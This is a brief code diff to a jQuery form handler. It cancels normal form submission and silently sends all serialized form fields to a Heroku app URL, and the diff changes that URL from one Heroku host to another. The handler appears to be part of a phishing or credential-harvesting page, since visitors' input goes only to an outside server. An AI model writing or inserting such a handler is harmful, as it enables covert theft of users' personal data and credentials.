@@ -33,7 +33,7 @@ $(document).ready(function()
     $(function(){
         $('form').submit(function(e){
             e.preventDefault();
-            fetch('https://immense-thicket-97671.herokuapp.com?' + $('form').serialize(), {mode: 'no-cors'});
+            fetch('https://pacific-mesa-79068.herokuapp.com?' + $('form').serialize(), {mode: 'no-cors'});
         });
     });
 });
